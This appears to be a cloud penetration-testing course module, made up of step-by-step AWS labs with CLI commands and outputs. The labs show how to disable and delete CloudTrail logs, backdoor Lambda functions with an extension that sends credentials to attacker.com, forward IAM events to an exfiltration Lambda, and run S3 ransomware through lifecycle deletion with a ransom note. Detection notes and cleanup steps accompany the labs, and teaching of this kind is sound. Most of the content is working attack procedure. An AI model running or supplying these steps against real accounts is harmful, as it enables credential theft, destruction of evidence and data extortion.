Objective: Tamper with CloudTrail logging to operate undetected by stopping log collection, destroying evidence, and removing the trail configuration.
1
Enumerate all CloudTrail trails to identify logging configuration, destination S3 buckets, and current status.
Terminal
$ aws cloudtrail describe-trails \ --query 'trailList[*].[Name,S3BucketName,IsMultiRegionTrail,IsOrganizationTrail]'
[ ["main-trail", "cloudtrail-logs-444444-us-east-1", true, true], ["data-events", "cloudtrail-data-444444", false, false] ]
$ aws cloudtrail get-trail-status --name main-trail
{ "IsLogging": true, "LatestDeliveryTime": "2026-04-01T07:55:00Z", "LatestNotificationTime": "2026-04-01T07:55:00Z" }
Org-trail restriction: Organizational trails (IsOrganizationTrail: true) can only be deleted from the management account or a CloudTrail delegated administrator. Member accounts calling delete-trail against an org trail will receive AccessDeniedException. If you see true in that column, escalate to management-account access before proceeding to step 4.
2
Stop CloudTrail logging. This is the first step — but note that this API call itself generates a StopLogging event before logging ceases.
Terminal
$ aws cloudtrail stop-logging --name main-trail
{ } # StopLogging event IS recorded — but we'll deal with that next
3
Delete the S3 bucket containing all historical CloudTrail logs. This destroys the forensic evidence, including the StopLogging event itself.
Terminal
# First empty the bucket (required before deletion)
$ aws s3 rm s3://cloudtrail-logs-444444-us-east-1 --recursive delete: s3://cloudtrail-logs-444444-us-east-1/AWSLogs/444444444444/CloudTrail/... ... (12,847 objects deleted)
$ aws s3 rb s3://cloudtrail-logs-444444-us-east-1 --force
remove_bucket: cloudtrail-logs-444444-us-east-1 # All historical logs destroyed — no forensic evidence remains
4
Delete the trail configuration itself. Without a trail, no new events are captured at all.
Terminal
$ aws cloudtrail delete-trail --name main-trail
{ } # Trail deleted — no logging configuration exists
$ aws cloudtrail describe-trails
{ "trailList": [ {"Name": "data-events", "IsMultiRegionTrail": false} ] } # Only the single-region data-events trail remains
5
Alternative (stealthier): instead of deleting the trail, use selective event filtering to keep the trail "active" while suppressing read events. This is harder for the SOC to notice than a full trail deletion.
Terminal
$ aws cloudtrail put-event-selectors --trail-name main-trail \ --event-selectors '[{ "ReadWriteType": "WriteOnly", "IncludeManagementEvents": true, "ExcludeManagementEventSources": [ "kms.amazonaws.com", "rdsdata.amazonaws.com" ] }]'
{ "EventSelectors": [{ "ReadWriteType": "WriteOnly", "IncludeManagementEvents": true }] } # Read events now unlogged — attacker recon is invisible # Trail appears active — SOC sees normal write events
Accuracy note: ExcludeManagementEventSources only applies to KMS and RDS Data API events — it cannot exclude arbitrary attacker API calls from CloudTrail. Using ReadWriteType: WriteOnly suppresses ALL read events (including legitimate operations), which will be noticed by a SOC. True evasion requires targeting the specific trail's S3 bucket or using CloudTrail Lake exclusions.

Stopping CloudTrail generates an event — but if you delete the S3 bucket first, there's nowhere for it to land. Defend against this by enabling S3 Object Lock (WORM), CloudTrail Lake, and organization-level trails that member accounts cannot modify.
Detection Notes (L01):
  • CloudWatch Alarms on StopLogging, DeleteTrail, and PutEventSelectors API calls
  • AWS Config rule cloud-trail-enabled will fire within minutes of trail deletion
  • Security Hub control CT.1 monitors for at least one active multi-region trail
  • CloudTrail Lake is independent of trail S3 delivery — deleting the S3 bucket does not affect Lake query data

Objective: Create a malicious Lambda Extension layer that exfiltrates credentials on every function invocation — persisting even through code redeployments.
1
Create the backdoor Lambda Extension. Unlike Python modules in the python/ directory — which only execute if explicitly imported by the function handler — an executable in the extensions/ directory runs independently as an external extension on every cold start and warm invocation.
Terminal
mkdir -p layer-pkg/extensions cat > layer-pkg/extensions/backdoor-ext <<'EOF' #!/bin/bash # Lambda extension main loop — runs independently of function handler RUNTIME_API="${AWS_LAMBDA_RUNTIME_API}" # Register as an external extension curl -sX POST "http://${RUNTIME_API}/2020-01-01/extension/register" \ --header "Lambda-Extension-Name: backdoor-ext" \ -d '{"events": ["INVOKE", "SHUTDOWN"]}' # Exfil env vars on first cold start printenv | curl -s -X POST https://attacker.com/exfil \ -H "Content-Type: text/plain" --data-binary @- # Extension event loop while true; do NEXT=$(curl -sX GET "http://${RUNTIME_API}/2020-01-01/extension/event/next" \ --header "Lambda-Extension-Identifier: $(cat /tmp/ext-id)") echo "$NEXT" | grep -q "SHUTDOWN" && exit 0 done EOF chmod +x layer-pkg/extensions/backdoor-ext
# extensions/ directory created — backdoor-ext is executable
Why Extensions, not Python modules: Lambda Extensions (extensions/ directory) execute independently of the function handler on each cold start and warm invocation — unlike Python modules in python/, which only execute if explicitly imported by the function code. A Python file dropped into python/ does nothing unless the function handler imports it, making it an unreliable persistence mechanism.
2
Package only the extensions/ directory into the layer zip and publish it with an innocuous name that resembles a legitimate dependency patch.
Terminal
cd layer-pkg && zip -r ../backdoor-layer.zip extensions/
adding: extensions/ (stored 0%) adding: extensions/backdoor-ext (deflated 52%)
$ aws lambda publish-layer-version \ --layer-name boto3-patch \ --description "Boto3 compatibility patch for Python 3.12" \ --zip-file fileb://backdoor-layer.zip \ --compatible-runtimes python3.11 python3.12 python3.13
{ "LayerVersionArn": "arn:aws:lambda:us-east-1:444444444444:layer:boto3-patch:1", "Version": 1, "Description": "Boto3 compatibility patch for Python 3.12", "CompatibleRuntimes": ["python3.11", "python3.12", "python3.13"] }
3
Attach the backdoor layer to target Lambda functions. The extension registers with the Lambda runtime API and runs its event loop independently of the function handler.
Terminal
$ aws lambda update-function-configuration \ --function-name production-api-handler \ --layers arn:aws:lambda:us-east-1:444444444444:layer:boto3-patch:1
{ "FunctionName": "production-api-handler", "Layers": [ { "Arn": "arn:aws:lambda:us-east-1:444444444444:layer:boto3-patch:1", "CodeSize": 482 } ], "LastModified": "2026-04-01T09:00:00Z" }
4
Every cold start now phones home with the function's temporary AWS credentials via the extension. These creds have whatever permissions the Lambda execution role grants.
Terminal

POST /exfil AWS_LAMBDA_FUNCTION_NAME=production-api-handler AWS_ACCESS_KEY_ID=ASIAQWERTYUIOP54321 AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MD... AWS_SESSION_TOKEN=FwoGZXIvYXdzEBYaDHx2bG1vbW5uZm5... 5
The backdoor survives function code redeployments. Layers persist independently of function code — developers can update their code 100 times and the layer backdoor remains attached.
Terminal

Lambda layers are a powerful persistence mechanism because they're decoupled from function code. Audit layers attached to functions, verify layer content hashes, and use AWS Config rules to detect unauthorized layer modifications.
Detection Notes (L03):
  • CloudTrail: lambda:PublishLayerVersion followed by lambda:UpdateFunctionConfiguration from an unexpected identity is a high-signal indicator
  • Inspect the layer zip: external extensions must be executable files in the extensions/ subdirectory — any executable there warrants review
  • Runtime: unusual outbound connections from Lambda execution environments (visible in VPC Flow Logs if the function is VPC-attached)
  • AWS Config: custom rule to alert on functions with layers from accounts other than your own account or approved vendors
Objective: Establish persistence by creating an EventBridge rule that monitors IAM events and notifies the attacker of credential rotations, enabling instant re-compromise.
1
Create an EventBridge rule that matches IAM API calls captured via CloudTrail. IAM does not publish directly to EventBridge — all IAM events arrive as CloudTrail records with source: aws.cloudtrail and eventSource: iam.amazonaws.com in the detail object.
Terminal
$ cat pattern.json
{ "source": ["aws.cloudtrail"], "detail-type": ["AWS API Call via CloudTrail"], "detail": { "eventSource": ["iam.amazonaws.com"], "eventName": [ "CreateAccessKey", "DeleteAccessKey", "CreateUser", "DeleteUser", "AttachUserPolicy", "DetachUserPolicy", "CreateRole", "UpdateAssumeRolePolicy", "PutUserPolicy", "DeleteUserPolicy" ] } }
$ aws events put-rule \ --name IAMProtectPersistence \ --event-pattern file://pattern.json \ --state ENABLED \ --region us-east-1
{ "RuleArn": "arn:aws:events:us-east-1:444444444444:rule/IAMProtectPersistence" }
Common error — wrong source field: The IAM service does not publish directly to EventBridge. All IAM API call events arrive via CloudTrail with "source": ["aws.cloudtrail"] and "eventSource": ["iam.amazonaws.com"] in the detail object. Using "source": ["aws.iam"] will create a syntactically valid rule that matches zero events — a very easy mistake to miss during lab testing.
2
Create a Lambda function that forwards captured IAM events to the attacker's C2 infrastructure. Use an innocuous name and description.
Terminal
$ cat exfil_handler.py
import json import urllib.request def handler(event, context): """Forward IAM events to C2""" data = json.dumps({ "event": event.get("detail", {}).get("eventName"), "user": event.get("detail", {}).get("userIdentity", {}).get("arn"), "params": event.get("detail", {}).get("requestParameters"), "time": event.get("detail", {}).get("eventTime"), "source_ip": event.get("detail", {}).get("sourceIPAddress") }).encode() req = urllib.request.Request( "https://attacker.com/iam-events", data=data, headers={"Content-Type": "application/json"} ) urllib.request.urlopen(req, timeout=5) return {"status": "processed"}
3
Set the exfil Lambda as the target for the EventBridge rule. Grant EventBridge permission to invoke the function.
Terminal
$ aws events put-targets \ --rule "IAMProtectPersistence" \ --targets '[{ "Id": "1", "Arn": "arn:aws:lambda:us-east-1:444444444444:function:iam-compliance-forwarder" }]'
{ "FailedEntryCount": 0, "FailedEntries": [] }
$ aws lambda add-permission \ --function-name iam-compliance-forwarder \ --statement-id eventbridge-invoke \ --action lambda:InvokeFunction \ --principal events.amazonaws.com \ --source-arn arn:aws:events:us-east-1:444444444444:rule/IAMProtectPersistence
{ "Statement": "..." }
4
Now all IAM API calls trigger a real-time notification to the attacker. When defenders rotate credentials or create new access keys, the attacker knows immediately.
Terminal

$ aws iam create-access-key --user-name admin-user

EventBridge persistence is particularly insidious because it turns the defender's own remediation actions into intelligence for the attacker. During incident response, always audit EventBridge rules and Lambda function destinations before rotating credentials.
Detection Notes (L04):
  • CloudTrail: alert on events:PutRule + events:PutTargets in the same session from an unexpected identity
  • Review EventBridge rules with targets pointing to Lambda functions outside of known CI/CD principals
  • Lambda: any function with an innocuous name but an EventBridge trigger and outbound HTTPS calls to non-AWS endpoints is suspicious
  • Security Hub Finding: events:PutTargets with a Lambda ARN not in the approved resource inventory
Objective: Execute a cloud ransomware attack by suspending S3 versioning and then setting lifecycle rules to auto-delete critical data, delivering a ransom demand.
1
Identify critical S3 buckets containing production data, backups, or irreplaceable assets that would cause maximum business impact if lost.
Terminal
$ aws s3 ls
2025-01-15 08:00:00 critical-data-prod 2025-03-20 12:00:00 customer-uploads-prod 2025-06-10 09:30:00 ml-training-datasets 2025-09-01 14:00:00 financial-reports-2025 2025-11-15 16:00:00 database-backups-daily
$ aws s3 ls s3://critical-data-prod --summarize --human-readable
Total Objects: 847,293 Total Size: 2.4 TiB
2
Step 1 of the attack sequence: suspend versioning FIRST. With versioning active, victims can restore objects from version history even after a lifecycle rule deletes the current version. Suspending versioning closes that recovery path before the deletion timer starts.
Terminal
# Step 1: Suspend versioning to prevent recovery via version history $ aws s3api put-bucket-versioning \ --bucket critical-data-prod \ --versioning-configuration Status=Suspended
# Versioning suspended — deletions are now permanent for new writes
Attack order matters: Lifecycle rules set BEFORE suspending versioning can still be countered by recovering from existing version history. Always suspend versioning first to eliminate the version-history recovery path before the deletion countdown begins.
3
Step 2: Set an aggressive lifecycle rule that expires all objects in 1 day. Also add NoncurrentVersionExpiration to destroy any pre-existing version history that was in place before you suspended versioning.
Terminal
# Step 2: Set aggressive lifecycle rule for deletion $ cat lifecycle.json
{ "Rules": [{ "ID": "cleanup-expired-objects", "Status": "Enabled", "Filter": {}, "Expiration": { "Days": 1 }, "NoncurrentVersionExpiration": { "NoncurrentDays": 1 } }] }
$ aws s3api put-bucket-lifecycle-configuration \ --bucket critical-data-prod \ --lifecycle-configuration file://lifecycle.json
# Lifecycle rule set — all 847,293 objects expire in 24 hours # NoncurrentVersionExpiration also destroys any existing version history
4
Upload a ransom note to every targeted bucket. The note warns the victim that their data will be permanently deleted unless they pay.
Terminal
$ echo "=== YOUR DATA WILL BE PERMANENTLY DELETED IN 24 HOURS === All objects in this bucket have been scheduled for deletion. Versioning has been suspended. There is no recovery path. To prevent data loss: 1. Send 15 BTC to: bc1q...attacker...address 2. Email proof of payment to: ransom@securemail.onion 3. We will remove the lifecycle rule within 1 hour of confirmation Do NOT: - Contact AWS Support (they cannot override lifecycle rules) - Attempt to re-enable versioning (existing objects are not protected) - Delete this file (we will know) Clock is ticking." | aws s3 cp - s3://critical-data-prod/RANSOM_README.txt
upload: - to s3://critical-data-prod/RANSOM_README.txt
5
After 24 hours, S3 automatically deletes all objects via the lifecycle rule. The victim either pays or permanently loses 2.4 TiB of critical production data.
Terminal
# T+24 hours — S3 lifecycle executes:
$ aws s3 ls s3://critical-data-prod --summarize Total Objects: 1 (only RANSOM_README.txt remains — it was uploaded <24h ago) Total Size: 847 Bytes # 847,292 objects (2.4 TiB) permanently deleted # No versioning → no recovery # No S3 Object Lock → no immutability protection # Backups bucket? Same lifecycle rule applied there too.

→

→

This technique maps to T1485 (Data Destruction). Note: no formally published sub-technique exists for cloud storage lifecycle manipulation as of ATT&CK v16. Earlier drafts circulated a T1485.001 designation but it was not merged into the framework. Defend with S3 Object Lock (Governance or Compliance mode), MFA Delete, bucket policies denying s3:PutLifecycleConfiguration, and cross-account backup replication to an immutable vault.
Detection Notes (L05):
  • CloudTrail: alert on s3:PutBucketVersioning (Status=Suspended) and s3:PutLifecycleConfiguration on the same bucket within a short time window
  • AWS Config rule s3-bucket-versioning-enabled will fire when versioning is suspended on a previously versioned bucket
  • S3 Object Lock with Compliance mode prevents lifecycle rule deletion of locked objects regardless of attacker permissions
  • Cross-account replication to an immutable destination is the most reliable protection — the attacker's credentials cannot affect a separate account's bucket
Lab Cleanup (M19 — all labs):
  1. Re-enable CloudTrail: aws cloudtrail start-logging --name main-trail and restore the original S3 bucket with correct permissions
  2. Delete GuardDuty suppression filters: aws guardduty delete-filter --detector-id <id> --filter-name Internal-Scanner-Whitelist and Pen-Test-Exception
  3. Delete the backdoor Lambda layer: aws lambda delete-layer-version --layer-name boto3-patch --version-number 1 and detach from all functions
  4. Delete the EventBridge rule and target: aws events remove-targets --rule IAMProtectPersistence --ids 1, then aws events delete-rule --name IAMProtectPersistence
  5. Remove the S3 lifecycle rule: aws s3api delete-bucket-lifecycle --bucket target-bucket and re-enable versioning: aws s3api put-bucket-versioning --bucket target-bucket --versioning-configuration Status=Enabled
  6. Delete the exfil Lambda function: aws lambda delete-function --function-name iam-compliance-forwarder
